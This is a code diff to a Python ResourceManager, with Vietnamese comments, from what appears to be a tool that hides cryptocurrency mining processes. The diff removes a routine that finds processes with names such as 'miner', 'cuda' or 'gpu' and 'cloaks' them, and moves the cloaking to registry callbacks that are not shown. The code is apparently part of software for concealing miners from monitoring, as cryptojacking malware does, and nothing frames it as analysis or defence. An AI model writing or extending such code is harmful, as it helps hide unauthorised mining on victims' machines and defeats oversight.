@@ -168,8 +168,8 @@ class ResourceManager(IResourceManager):
     **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
     
     **Simplified Architecture** (kiến trúc đơn giản hóa):
-    - Process Discovery & Cloaking
-    - No Monitoring or Restoration  
+    - DirectPIDRegistry Observer-Based Cloaking
+    - No Process Discovery or Monitoring  
     - Thread-Safe Singleton Pattern
     """
 
@@ -371,8 +371,8 @@ class ResourceManager(IResourceManager):
             # **Start Worker Threads** (khởi động worker threads)
             self._start_workers()
             
-            # **Discover Existing Processes** (khám phá processes hiện có)
-            self._discover_and_register_existing_processes()
+            # **DirectPIDRegistry Observer** (DirectPIDRegistry observer đã được thiết lập trong __init__)
+            # Process discovery sẽ được xử lý thông qua DirectPIDRegistry callbacks
             
             # **Signal Ready** (báo hiệu sẵn sàng)
             self.signal_ready()
@@ -396,21 +396,6 @@ class ResourceManager(IResourceManager):
         
         self.logger.info("Worker threads đã khởi động")
 
-    def _discover_and_register_existing_processes(self) -> None:
-        """**Discover and Register Existing Processes** (khám phá và đăng ký processes hiện có)"""
-        try:
-            existing_processes = self.discover_mining_processes()
-            
-            for process in existing_processes:
-                try:
-                    self.trigger_cloaking(process, 'discovery')
-                except Exception as e:
-                    self.logger.error(f"Lỗi cloaking process {process.pid}: {e}")
-                    
-            self.logger.info(f"Đã khám phá và cloaking {len(existing_processes)} processes")
-            
-        except Exception as e:
-            self.logger.error(f"Lỗi khám phá processes: {e}")
 
     def process_resource_adjustments(self):
         """**Process Resource Adjustments** (xử lý điều chỉnh tài nguyên)"""
@@ -428,32 +413,6 @@ class ResourceManager(IResourceManager):
             except Exception as e:
                 self.logger.error(f"Lỗi xử lý resource adjustment: {e}")
 
-    def discover_mining_processes(self) -> List[MiningProcess]:
-        """**Discover Mining Processes** (khám phá mining processes)"""
-        processes = []
-        
-        try:
-            for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
-                try:
-                    info = proc.info
-                    name = info['name'].lower()
-                    
-                    # **Mining Process Detection** (phát hiện mining process)
-                    if any(keyword in name for keyword in ['miner', 'mining', 'cuda', 'gpu']):
-                        mining_process = MiningProcess(
-                            pid=info['pid'],
-                            name=info['name'],
-                            cmd=info['cmdline'] or []
-                        )
-                        processes.append(mining_process)
-                        
-                except (psutil.NoSuchProcess, psutil.AccessDenied):
-                    continue
-                    
-        except Exception as e:
-            self.logger.error(f"Lỗi khám phá mining processes: {e}")
-            
-        return processes
 
     def shutdown(self):
         """**Shutdown ResourceManager** (tắt ResourceManager)"""
